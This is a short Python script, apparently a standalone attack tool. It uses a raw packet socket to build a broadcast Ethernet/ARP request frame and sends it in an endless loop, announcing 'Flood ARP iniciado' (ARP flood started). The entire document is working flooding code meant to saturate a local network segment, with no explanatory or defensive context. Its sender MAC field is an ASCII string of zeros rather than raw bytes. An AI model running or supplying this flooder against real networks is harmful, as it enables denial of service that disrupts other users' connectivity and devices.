#!/bin/python3
#victor.oliveira@gmx.com
import socket
import struct
import sys

s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
s.bind((sys.argv[1], 0))

#Ether
addr_dest = b'\xff\xff\xff\xff\xff\xff' #MAC destination
addr_send = b'00000000' #MAC sender
proto_type = 0x0806 #Protocol type

ether_frame = struct.pack('!6s6sH', addr_dest, addr_send, proto_type)

#ARP
hrd = 0x01 #Hardware address space
pro = 0x0800 #Protocol address space
hln = 0x06 #Byte length of MAC
pln = 0x04 #Byte length of IPv4
op = 0x01 #Opcode
sha = b'\xff\xff\xff\xff\xff\xff' #MAC packet sender
spa = socket.inet_aton('0.0.0.0') #IPv4 packet sender
tha = b'\xff\xff\xff\xff\xff\xff' #MAC target
tpa = socket.inet_aton('0.0.0.0') #IPv4 target

arp_frame = struct.pack('!HHBBH6s4s6s4s',
                        hrd, pro, hln, pln, op, sha, spa, tha, tpa)

frame = ether_frame + arp_frame

try:
    print('Flood ARP iniciado')
    while True:
        s.send(frame)
except KeyboardInterrupt:
    print('Interrompido')
